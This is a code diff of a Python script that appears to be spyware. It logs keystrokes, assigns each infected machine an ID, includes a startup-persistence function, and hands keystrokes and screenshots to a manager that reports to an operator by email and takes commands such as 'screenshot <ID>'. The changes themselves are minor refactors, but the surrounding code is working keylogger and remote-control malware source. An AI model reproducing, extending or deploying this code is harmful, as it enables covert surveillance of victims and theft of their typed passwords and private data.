@@ -25,14 +25,16 @@ import datetime
 # ss = screenshotfolder
 # logs = screenshotfolder
 
-def is_connected():
+
+def is_connected(check_rate):
     try:
         # Attempt to create a socket and connect to Google's public DNS server
-        socket.create_connection(("8.8.8.8", 53), timeout=3)
+        socket.create_connection(("8.8.8.8", 53), timeout=check_rate)
         return True
     except OSError:
         pass
     return False
+
 
 def add_to_startup():
     script_path = os.path.abspath(sys.argv[0])
@@ -57,13 +59,13 @@ try:
 except FileExistsError:
     print("Folder already exists.")
 
+first_time = False
+
 # ID assignment
 id_file = os.path.dirname(os.path.abspath(sys.argv[0])) + "\\id"
-
 if not os.path.exists(os.path.dirname(os.path.abspath(sys.argv[0])) + "\\id"):
+    first_time = True
     id = str(random.randint(1, 10000))
-
-    # Open the file in write mode ('w')
     with open(id_file, 'w') as file:
         file.write(str(id))
 else:
@@ -74,13 +76,11 @@ print(id)
 
 # Keylog section
 inputs = []
-
 z = 1
 
 
 def on_press(key):
     global z
-
     try:
         inputs.append(key.char)
         if key.char == '@':
@@ -93,7 +93,6 @@ def on_press(key):
 
 
 def on_release(key):
-    ...
     if key == keyboard.Key.esc:
         # Stop listener
         return False
@@ -104,8 +103,9 @@ listener = keyboard.Listener(
     on_release=on_release)
 listener.start()
 
-email = "email"
-password = "password"
+email = ""
+password = ""
+check_rate = 2
 
 # add_to_startup()
 # usage: Command ID, eg: screenshot 7512
@@ -115,14 +115,14 @@ if __name__ == "__main__":
 
     setup = 0
     while setup == 0:
-        if is_connected():
-            manager.new_email(manager.email, "ID", "screenshot", "[+] ID: " + str(id) + "\n[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
+        if is_connected(check_rate):
+            manager.send_setup(first_time)
             setup = 1
         else:
             print("not connected")
             pass
     while True:
-        if is_connected():
+        if is_connected(check_rate):
             manager.keys = inputs
             manager.scheduled_check()
         else:
